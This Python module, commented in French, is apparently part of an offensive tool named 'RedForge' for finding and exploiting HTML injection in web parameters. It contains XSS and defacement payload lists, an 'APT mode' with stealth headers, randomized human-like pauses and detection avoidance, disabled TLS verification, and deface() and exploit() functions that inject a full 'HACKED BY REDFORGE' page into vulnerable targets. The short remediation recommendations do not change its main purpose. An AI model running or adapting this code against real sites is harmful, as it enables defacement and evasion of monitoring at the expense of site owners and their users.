#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection HTML pour RedForge
Détecte et exploite les vulnérabilités d'injection de code HTML
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from html import escape, unescape
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class HTMLInjectionConfig:
    """Configuration avancée pour l'injection HTML"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    test_all_contexts: bool = True
    detect_defacement: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_context: bool = True
    test_encoded_payloads: bool = True
    max_payload_size: int = 2000


class HTMLInjection:
    """Détection et exploitation avancée des injections HTML"""
    
    def __init__(self, config: Optional[HTMLInjectionConfig] = None):
        """
        Initialise le détecteur d'injection HTML
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or HTMLInjectionConfig()
        
        # Payloads d'injection HTML organisés par catégorie
        self.payloads = self._generate_payloads()
        
        # Signatures de détection
        self.success_indicators = [
            'INJECTED', 'HACKED', 'REDFORGE', 'injected', 'hacked',
            'redforge', 'XSS', 'ALERT', 'alert'
        ]
        
        # Patterns de contexte HTML
        self.context_patterns = {
            "tag": r'<[^>]*%s[^>]*>',
            "attribute": r'=\s*["\'][^"\']*%s[^"\']*["\']',
            "text": r'>[^<]*%s[^<]*<',
            "comment": r'<!--.*?%s.*?-->',
            "script": r'<script[^>]*>.*?%s.*?</script>'
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads d'injection HTML"""
        unique_id = f"INJ_{int(time.time())}_{random.randint(1000,9999)}"
        
        payloads = {
            "Basic": [
                f"<h1>{unique_id}</h1>",
                f"<b>{unique_id}</b>",
                f"<i>{unique_id}</i>",
                f"<u>{unique_id}</u>",
                f"<mark>{unique_id}</mark>",
                f"<strong>{unique_id}</strong>",
                f"<em>{unique_id}</em>"
            ],
            "Structural": [
                f"<div>{unique_id}</div>",
                f"<span>{unique_id}</span>",
                f"<p>{unique_id}</p>",
                f"<section>{unique_id}</section>",
                f"<article>{unique_id}</article>",
                f"<header>{unique_id}</header>",
                f"<footer>{unique_id}</footer>"
            ],
            "Attributes": [
                f"<img title='{unique_id}'>",
                f"<div class='{unique_id}'>",
                f"<span id='{unique_id}'>",
                f"<a href='javascript:void(0)'>{unique_id}</a>",
                f"<input value='{unique_id}'>",
                f"<meta name='test' content='{unique_id}'>"
            ],
            "Events": [
                f"<img src=x onerror='alert(\"{unique_id}\")'>",
                f"<body onload='alert(\"{unique_id}\")'>",
                f"<div onmouseover='alert(\"{unique_id}\")'>{unique_id}</div>",
                f"<input onfocus='alert(\"{unique_id}\")' autofocus>",
                f"<svg onload='alert(\"{unique_id}\")'>"
            ],
            "Encoded": [
                quote(f"<h1>{unique_id}</h1>"),
                base64.b64encode(f"<h1>{unique_id}</h1>".encode()).decode(),
                f"&#60;h1&#62;{unique_id}&#60;/h1&#62;",
                f"\\x3Ch1\\x3E{unique_id}\\x3C/h1\\x3E",
                f"%3Ch1%3E{unique_id}%3C/h1%3E"
            ],
            "Defacement": [
                f"<body style='background:black;color:red'><h1>{unique_id}</h1>",
                f"<html><head><title>{unique_id}</title></head><body><h1>{unique_id}</h1></body></html>",
                f"<div style='position:fixed;top:0;left:0;width:100%;background:black;color:red;text-align:center'><h1>{unique_id}</h1></div>"
            ],
            "Stealth": [
                f"<!-- {unique_id} -->",
                f"<style>.test{{content:'{unique_id}'}}</style>",
                f"<script>/*{unique_id}*/</script>",
                f"<noscript>{unique_id}</noscript>"
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection HTML
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections HTML sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, post_data)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    print(f"      ✓ Injection HTML: {param} -> {vuln['payload'][:40]}...")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        if 'test_all_contexts' in kwargs:
            self.config.test_all_contexts = kwargs['test_all_contexts']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads = min(self.config.max_payloads, 20)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['q', 'search', 's', 'query', 'name', 'message', 'content', 
                     'text', 'comment', 'description', 'title', 'author', 'email',
                     'username', 'firstname', 'lastname', 'address', 'city']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameter(self, target: str, param: str, 
                        post_data: Optional[str] = None) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections HTML"""
        vulnerabilities = []
        payloads_tested = 0
        
        for category, payload_list in self.payloads.items():
            for payload in payload_list[:self.config.max_payloads]:
                # Pause entre les tests
                if self.config.random_delays and payloads_tested > 0:
                    time.sleep(random.uniform(0.3, 0.8))
                
                result = self._test_payload(target, param, payload, post_data)
                self.payloads_tested += 1
                payloads_tested += 1
                
                if result['vulnerable']:
                    vulnerabilities.append({
                        "parameter": param,
                        "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                        "category": category,
                        "severity": "MEDIUM",
                        "evidence": result['evidence'],
                        "context": result.get('context', 'unknown'),
                        "risk_score": 60
                    })
                    return vulnerabilities  # Arrêter pour ce paramètre
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str, 
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload d'injection HTML"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'context': None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=10, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    query_params[param] = [payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier si le payload est présent dans la réponse
            unescaped_text = unescape(response.text)
            
            # Nettoyer le payload pour la comparaison
            clean_payload = escape(payload)
            
            # Extraire le marqueur unique du payload
            unique_marker = re.search(r'INJ_\d+_\d+', payload)
            if unique_marker:
                marker = unique_marker.group()
                if marker in response.text or marker in unescaped_text:
                    result['vulnerable'] = True
                    result['evidence'] = 'unique_marker_reflected'
                    
                    # Déterminer le contexte
                    if self.config.detect_context:
                        result['context'] = self._detect_context(response.text, marker)
            
            # Vérifier les indicateurs
            for indicator in self.success_indicators:
                if indicator in response.text:
                    result['vulnerable'] = True
                    result['evidence'] = indicator
                    break
                    
        except Exception as e:
            if not self.config.passive_detection:
                pass
        
        return result
    
    def _detect_context(self, text: str, marker: str) -> str:
        """
        Détermine le contexte d'injection HTML
        
        Args:
            text: Texte de la réponse
            marker: Marqueur injecté
        """
        for context, pattern in self.context_patterns.items():
            if re.search(pattern % re.escape(marker), text, re.IGNORECASE | re.DOTALL):
                return context
        return "unknown"
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "test_all_contexts": self.config.test_all_contexts
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune injection HTML détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_category": {
                "basic": len([v for v in vulnerabilities if v['category'] == 'Basic']),
                "defacement": len([v for v in vulnerabilities if v['category'] == 'Defacement']),
                "events": len([v for v in vulnerabilities if v['category'] == 'Events'])
            },
            "by_context": {
                "tag": len([v for v in vulnerabilities if v['context'] == 'tag']),
                "attribute": len([v for v in vulnerabilities if v['context'] == 'attribute']),
                "text": len([v for v in vulnerabilities if v['context'] == 'text']),
                "script": len([v for v in vulnerabilities if v['context'] == 'script'])
            },
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Encoder les données utilisateur avec htmlspecialchars() ou équivalent")
            recommendations.add("Utiliser des politiques CSP strictes")
        
        if any(v['category'] == 'Events' for v in vulnerabilities):
            recommendations.add("Désactiver les attributs d'événements HTML (onclick, onload, etc.)")
        
        if any(v['context'] == 'attribute' for v in vulnerabilities):
            recommendations.add("Encoder les guillemets et caractères spéciaux dans les attributs")
        
        if any(v['category'] == 'Defacement' for v in vulnerabilities):
            recommendations.add("Restreindre les entrées utilisateur dans les zones sensibles")
        
        return list(recommendations)
    
    def deface(self, target: str, param: str, custom_html: str = None,
               stealth: bool = False) -> Dict[str, Any]:
        """
        Tente de défigurer la page via injection HTML
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            custom_html: HTML personnalisé pour le defacement
            stealth: Mode furtif (moins visible)
        """
        if not custom_html:
            if stealth:
                custom_html = """
                <div style='display:none' id='redforge_watermark'>SECURITY_TEST</div>
                """
            else:
                custom_html = """
                <!DOCTYPE html>
                <html>
                <head><title>HACKED</title>
                <style>
                    body{background:black;color:red;text-align:center;padding-top:20%;font-family:monospace}
                    h1{font-size:48px;animation:blink 1s infinite}
                    @keyframes blink{50%{opacity:0}}
                </style>
                </head>
                <body>
                    <h1>⚠️ HACKED BY REDFORGE ⚠️</h1>
                    <p>This site has been compromised for security testing</p>
                    <p>Contact: security@redforge.com</p>
                    <small>Authorized penetration testing</small>
                </body>
                </html>
                """
        
        result = self.exploit(target, param, custom_html)
        return result
    
    def exploit(self, target: str, param: str, html_code: str) -> Dict[str, Any]:
        """
        Exploite une injection HTML
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            html_code: Code HTML à injecter
        """
        result = {
            "success": False,
            "injected": False,
            "url": None,
            "response_length": 0
        }
        
        parsed = urlparse(target)
        query_params = parse_qs(parsed.query)
        
        if param in query_params:
            query_params[param] = [html_code]
        else:
            query_params[param] = [html_code]
        
        new_query = urlencode(query_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Vérifier l'injection
            if html_code in response.text or escape(html_code[:50]) in response.text:
                result["success"] = True
                result["injected"] = True
                result["url"] = test_url
                result["response_length"] = len(response.text)
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = HTMLInjection()
    results = injection.scan("https://example.com/search?q=test")
    print(f"Vulnérabilités HTML: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = HTMLInjectionConfig(apt_mode=True, max_payloads=20)
    injection_apt = HTMLInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/search?q=test", apt_mode=True)
    print(f"Vulnérabilités HTML (APT): {results_apt['count']}")
    
    # Exemple de defacement
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        deface_result = injection_apt.deface(
            "https://example.com/search",
            vuln['parameter'],
            stealth=True
        )
        if deface_result['success']:
            print(f"Defacement réussi: {deface_result['url']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")